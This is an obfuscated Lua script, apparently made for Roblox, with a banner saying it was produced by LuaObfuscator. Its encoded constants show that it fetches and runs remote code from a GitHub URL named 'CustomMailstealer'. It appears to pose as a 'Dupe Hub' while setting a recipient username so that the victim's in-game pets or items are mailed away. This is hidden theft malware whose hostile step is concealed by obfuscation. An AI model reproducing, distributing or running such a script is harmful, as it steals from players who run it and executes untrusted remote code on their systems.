--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.9.19) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then local v83=0;while true do if (v83==0) then v19=v0(v3(v30,1,1));return "";end end else local v84=v2(v0(v30,16));if v19 then local v91=v5(v84,v19);v19=nil;return v91;else return v84;end end end);local function v20(v31,v32,v33)if v33 then local v85=0 -0 ;local v86;while true do if (v85==(0 -0)) then v86=(v31/((1639 -(1523 + 114))^(v32-(1 -(0 + 0)))))%((2 + 0)^(((v33-(2 -1)) -(v32-(1 + 0))) + (620 -(555 + 64)))) ;return v86-(v86%1) ;end end else local v87=931 -(857 + 74) ;local v88;while true do if (v87==(1270 -(226 + 1044))) then v88=(570 -((1324 -(892 + 65)) + 201))^(v32-(928 -(214 + 713))) ;return (((v31%(v88 + v88))>=v88) and (1 + 0)) or 0 ;end end end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35=0 -0 ;local v36;local v37;while true do if (v35==(0 -0)) then v36,v37=v1(v16,v18,v18 + (3 -1) );v18=v18 + (352 -(87 + (645 -382))) ;v35=181 -(67 + 113) ;end if (v35==1) then return (v37 * (188 + 68)) + v36 ;end end end local function v23()local v38=0 + 0 ;local v39;local v40;local v41;local v42;while true do if (v38==(3 -2)) then return (v42 * (16778168 -(802 + 150))) + (v41 * (38178 + 27358)) + (v40 * ((596 -260) -80)) + v39 ;end if (v38==(1187 -(1069 + 118))) then v39,v40,v41,v42=v1(v16,v18,v18 + ((7 + 0) -4) );v18=v18 + (6 -2) ;v38=1 + 0 ;end end end local function v24()local v43=(1948 -1063) -(261 + 624) ;local v44;local v45;local v46;local v47;local v48;local v49;while true do if (v43==(17 -(9 + 5))) then if (v48==(791 -(368 + 423))) then if (v47==(0 -0)) then return v49 * (18 -(10 + 8)) ;else v48=3 -2 ;v46=(376 -(85 + 291)) -0 ;end elseif (v48==(2489 -(416 + 26))) then return ((v47==(0 -0)) and (v49 * (((1266 -(243 + 1022)) + 0)/(0 + 0)))) or (v49 * NaN) ;end return v8(v49,v48-((6883 -5074) -786) ) * (v46 + (v47/((440 -(145 + 293))^(1965 -(1789 + 124))))) ;end if (v43==(431 -(44 + 386))) then v46=1487 -(998 + 488) ;v47=(v20(v45,1 + 0 + 0 ,(1197 -(1123 + 57)) + 3 ) * ((774 -(201 + 571))^(26 + 6))) + v44 ;v43=1140 -(116 + 1022) ;end if (v43==(0 -0)) then v44=v23();v45=v23();v43=1 + 0 ;end if (v43==(4 -2)) then v48=v20(v45,1434 -(447 + 966) ,113 -82 );v49=((v20(v45,113 -81 )==(860 -(814 + 45))) and  -(2 -1)) or (1 + 0) ;v43=2 + 1 ;end end end local function v25(v50)local v51=0 + 0 + 0 ;local v52;local v53;while true do if (v51==(255 -(163 + 91))) then v52=v3(v16,v18,(v18 + v50) -1 );v18=v18 + v50 ;v51=1932 -(1869 + 61) ;end if (v51==3) then return v6(v53);end if (v51==(0 + 0)) then v52=nil;if  not v50 then v50=v23();if (v50==(0 -0)) then return "";end end v51=1 -0 ;end if (v51==2) then v53={};for v92=1 + 0 , #v52 do v53[v92]=v2(v1(v3(v52,v92,v92)));end v51=3 -0 ;end end end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v54=1213 -(939 + 274) ;local v55;local v56;local v57;local v58;local v59;local v60;local v61;local v62;while true do if (3==v54) then v61=nil;v62=nil;v54=417 -(15 + 398) ;end if (v54~=2) then else v59=nil;v60=nil;v54=3;end if (v54==4) then while true do if (v55==(984 -(18 + 964))) then local v100=0 -0 ;while true do if (v100==(0 + 0)) then v60=nil;v61=nil;v100=1;end if (v100~=(1 + 0)) then else v55=853 -(20 + 830) ;break;end end end if (v55==(3 + 0)) then v62=nil;while true do local v103=0;local v104;while true do if (v103~=(126 -(116 + 10))) then else v104=0;while true do if (v104==0) then local v136=0;local v137;while true do if (v136==(0 + 0)) then v137=0;while true do if (v137==1) then v104=739 -(542 + 196) ;break;end if (v137==(0 -0)) then local v159=0 + 0 ;while true do if (v159==0) then if (v56~=1) then else local v160=0 + 0 ;local v161;local v162;while true do if (v160~=(0 + 0)) then else v161=0 -0 ;v162=nil;v160=2 -1 ;end if (v160==1) then while true do if (v161~=0) then else v162=0;while true do if (v162==(1552 -(1126 + 425))) then local v167=405 -(118 + 287) ;while true do if ((3 -2)==v167) then v162=2;break;end if (v167~=0) then else for v171=1,v61 do local v172=1121 -(118 + 1003) ;local v173;local v174;local v175;local v176;while true do if (v172~=(2 -1)) then else v175=nil;v176=nil;v172=2;end if (v172~=(377 -(142 + 235))) then else v173=0 -0 ;v174=nil;v172=1;end if (v172==2) then while true do if (v173~=0) then else local v183=0;while true do if (v183==1) then v173=1 + 0 ;break;end if ((977 -(553 + 424))~=v183) then else v174=0 -0 ;v175=nil;v183=1 + 0 ;end end end if (v173==(1 + 0)) then v176=nil;while true do if ((1 + 0)==v174) then if (v175==(1 + 0)) then v176=v21()~=(0 + 0) ;elseif (v175==(4 -2)) then v176=v24();elseif (v175==3) then v176=v25();end v62[v171]=v176;break;end if (v174~=0) then else local v191=0;local v192;while true do if (v191~=0) then else v192=0 -0 ;while true do if (v192==0) then local v195=0 -0 ;while true do if (v195~=(1 + 0)) then else v192=4 -3 ;break;end if (v195~=0) then else v175=v21();v176=nil;v195=1;end end end if (1~=v192) then else v174=754 -(239 + 514) ;break;end end break;end end end end break;end end break;end end end v60[3]=v21();v167=1;end end end if (v162~=(0 + 0)) then else local v168=0;while true do if (v168==0) then v61=v23();v62={};v168=1330 -(797 + 532) ;end if (v168==(1 + 0)) then v162=1;break;end end end if (2~=v162) then else v56=1 + 1 ;break;end end break;end end break;end end end if (v56~=(4 -2)) then else local v163=0;local v164;while true do if (v163==(1202 -(373 + 829))) then v164=0;while true do local v166=731 -(476 + 255) ;while true do if (v166~=(1130 -(369 + 761))) then else if (v164==(0 + 0)) then local v169=0;while true do if (v169==0) then for v177=1 -0 ,v23() do local v178=0;local v179;local v180;while true do if (v178~=(0 -0)) then else v179=0;v180=nil;v178=239 -(64 + 174) ;end if (v178~=1) then else while true do if (v179~=(0 + 0)) then else v180=v21();if (v20(v180,1 -0 ,337 -(144 + 192) )==(216 -(42 + 174))) then local v184=0;local v185;local v186;local v187;local v188;local v189;while true do if (v184==0) then v185=0;v186=nil;v184=1 + 0 ;end if (v184==(1 + 0)) then v187=nil;v188=nil;v184=1 + 1 ;end if (v184~=2) then else v189=nil;while true do if (v185~=0) then else local v193=1504 -(363 + 1141) ;while true do if (v193==1) then v185=1581 -(1183 + 397) ;break;end if (v193==0) then v186=0;v187=nil;v193=2 -1 ;end end end if (v185~=(2 + 0)) then else while true do if (v186==(1 + 0)) then local v196=1975 -(1913 + 62) ;while true do if (v196~=1) then else v186=2;break;end if (v196~=(0 + 0)) then else v189={v22(),v22(),nil,nil};if (v187==(1661 -(1477 + 184))) then local v203=0;local v204;while true do if (v203==(0 -0)) then v204=0;while true do if (v204~=(0 + 0)) then else v189[859 -(564 + 292) ]=v22();v189[6 -2 ]=v22();break;end end break;end end elseif (v187==(2 -1)) then v189[3]=v23();elseif (v187==2) then v189[307 -(244 + 60) ]=v23() -((2 + 0)^(492 -(41 + 435))) ;elseif (v187==(1004 -(938 + 63))) then local v213=0;local v214;local v215;while true do if (0~=v213) then else v214=0;v215=nil;v213=1 + 0 ;end if (v213==(1126 -(936 + 189))) then while true do if (v214~=(0 + 0)) then else v215=0;while true do if (v215~=(1613 -(1565 + 48))) then else v189[3]=v23() -((2 + 0)^16) ;v189[1142 -(782 + 356) ]=v22();break;end end break;end end break;end end end v196=1;end end end if (v186==2) then local v197=0;while true do if (v197~=(268 -(176 + 91))) then else v186=7 -4 ;break;end if (v197~=0) then else local v202=0;while true do if (v202==0) then if (v20(v188,1 -0 ,1093 -(975 + 117) )~=(1876 -(157 + 1718))) then else v189[2]=v62[v189[2]];end if (v20(v188,2 + 0 ,6 -4 )==(3 -2)) then v189[1021 -(697 + 321) ]=v62[v189[7 -4 ]];end v202=1 -0 ;end if (v202~=1) then else v197=1;break;end end end end end if (v186==0) then local v198=0;while true do if (v198==(2 -1)) then v186=1 + 0 ;break;end if (v198~=(0 -0)) then else v187=v20(v180,5 -3 ,3);v188=v20(v180,4,6);v198=1228 -(322 + 905) ;end end end if (v186~=(614 -(602 + 9))) then else if (v20(v188,3,1192 -(449 + 740) )~=1) then else v189[4]=v62[v189[4]];end v57[v177]=v189;break;end end break;end if (v185~=1) then else local v194=0;while true do if (v194~=1) then else v185=874 -(826 + 46) ;break;end if ((947 -(245 + 702))==v194) then v188=nil;v189=nil;v194=1;end end end end break;end end end break;end end break;end end end for v181=1,v23() do v58[v181-(3 -2) ]=v28();end v169=1 + 0 ;end if (v169==(1899 -(260 + 1638))) then v164=1;break;end end end if (v164~=1) then else return v60;end break;end end end break;end end end v159=441 -(382 + 58) ;end if ((3 -2)~=v159) then else v137=1;break;end end end end break;end end end if (v104==1) then if (v56==(0 + 0)) then local v152=0 -0 ;while true do if (v152==2) then v56=1;break;end if ((0 -0)~=v152) then else local v156=1205 -(902 + 303) ;local v157;while true do if (v156~=0) then else v157=0;while true do if (v157~=(1 -0)) then else v152=1;break;end if (v157~=(0 -0)) then else local v165=0 + 0 ;while true do if (1~=v165) then else v157=1691 -(1121 + 569) ;break;end if (v165==(214 -(22 + 192))) then v57={};v58={};v165=684 -(483 + 200) ;end end end end break;end end end if (v152~=(1464 -(1404 + 59))) then else local v158=0;while true do if (v158~=(2 -1)) then else v152=2;break;end if (v158==0) then v59={};v60={v57,v58,nil,v59};v158=563 -(334 + 228) ;end end end end end break;end end break;end end end break;end if (v55==1) then local v101=0 -0 ;while true do if ((0 -0)~=v101) then else local v105=0;while true do if (v105~=(1 -0)) then else v101=1 + 0 ;break;end if (v105~=0) then else v58=nil;v59=nil;v105=1;end end end if (v101~=(237 -(141 + 95))) then else v55=2 + 0 ;break;end end end if ((0 -0)==v55) then local v102=0;while true do if (v102==1) then v55=2 -1 ;break;end if (v102~=0) then else v56=0 + 0 ;v57=nil;v102=2 -1 ;end end end end break;end if (v54==1) then v57=nil;v58=nil;v54=2;end if (0==v54) then v55=0 + 0 ;v56=nil;v54=1 + 0 ;end end end local function v29(v63,v64,v65)local v66=v63[1];local v67=v63[2];local v68=v63[3];return function(...)local v69=v66;local v70=v67;local v71=v68;local v72=v27;local v73=1;local v74= -1;local v75={};local v76={...};local v77=v12("#",...) -1 ;local v78={};local v79={};for v89=0,v77 do if (v89>=v71) then v75[v89-v71 ]=v76[v89 + 1 ];else v79[v89]=v76[v89 + 1 ];end end local v80=(v77-v71) + 1 ;local v81;local v82;while true do local v90=0;while true do if (v90==1) then if (v82<=4) then if (v82<=1) then if (v82>0) then local v106=v81[2];local v107=v79[v81[3]];v79[v106 + 1 ]=v107;v79[v106]=v107[v81[4]];else local v111=v81[2];v79[v111]=v79[v111](v13(v79,v111 + 1 ,v74));end elseif (v82<=2) then local v113;local v114,v115;local v116;local v117;v65[v81[3]]=v79[v81[2]];v73=v73 + 1 ;v81=v69[v73];if ((v81[3]=="_ENV") or (v81[3]=="getfenv")) then v79[v81[2]]=v65;else v79[v81[2]]=v65[v81[3]];end v73=v73 + 1 ;v81=v69[v73];if ((v81[3]=="_ENV") or (v81[3]=="getfenv")) then v79[v81[2]]=v65;else v79[v81[2]]=v65[v81[3]];end v73=v73 + 1 ;v81=v69[v73];v117=v81[2];v116=v79[v81[3]];v79[v117 + 1 ]=v116;v79[v117]=v116[v81[4]];v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]=v81[3];v73=v73 + 1 ;v81=v69[v73];v117=v81[2];v114,v115=v72(v79[v117](v13(v79,v117 + 1 ,v81[3])));v74=(v115 + v117) -1 ;v113=0;for v131=v117,v74 do v113=v113 + 1 ;v79[v131]=v114[v113];end v73=v73 + 1 ;v81=v69[v73];v117=v81[2];v79[v117]=v79[v117](v13(v79,v117 + 1 ,v74));v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]();v73=v73 + 1 ;v81=v69[v73];v73=v81[3];elseif (v82>3) then do return;end else v65[v81[3]]=v79[v81[2]];end elseif (v82<=7) then if (v82<=5) then local v127=v81[2];local v128,v129=v72(v79[v127](v13(v79,v127 + 1 ,v81[3])));v74=(v129 + v127) -1 ;local v130=0;for v134=v127,v74 do local v135=0;while true do if (v135==0) then v130=v130 + 1 ;v79[v134]=v128[v130];break;end end end elseif (v82>6) then if (v79[v81[2]]==v81[4]) then v73=v73 + 1 ;else v73=v81[3];end else v73=v81[3];end elseif (v82<=8) then if ((v81[3]=="_ENV") or (v81[3]=="getfenv")) then v79[v81[2]]=v65;else v79[v81[2]]=v65[v81[3]];end elseif (v82>9) then v79[v81[2]]();else v79[v81[2]]=v81[3];end v73=v73 + 1 ;break;end if (v90==0) then v81=v69[v73];v82=v81[1];v90=1;end end end end;end return v29(v28(),{},v17)(...);end v15("LOL!0C3O00028O00026O00F03F030D3O00475F4D61696C6D652O7361676503073O00657A2070657473030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034B3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4C7970686572582F4D6F7269437573746F6D2F6D61696E2F437573746F6D4D61696C737465616C657203083O00557365726E616D6503083O003834785F4E617263030F3O00475F4C6F6164696E675363722O656E03083O004475706520487562001E3O0012093O00013O0026073O000D000100020004063O000D0001001209000100043O001202000100033O00122O000100053O00122O000200063O00202O00020002000700122O000400086O000200046O00013O00024O00010001000100044O001D00010026073O0001000100010004063O00010001001209000100013O00260700010017000100010004063O001700010012090002000A3O001203000200093O0012090002000C3O0012030002000B3O001209000100023O00260700010010000100020004063O001000010012093O00023O0004063O000100010004063O001000010004063O000100012O00043O00017O00",v9(),...);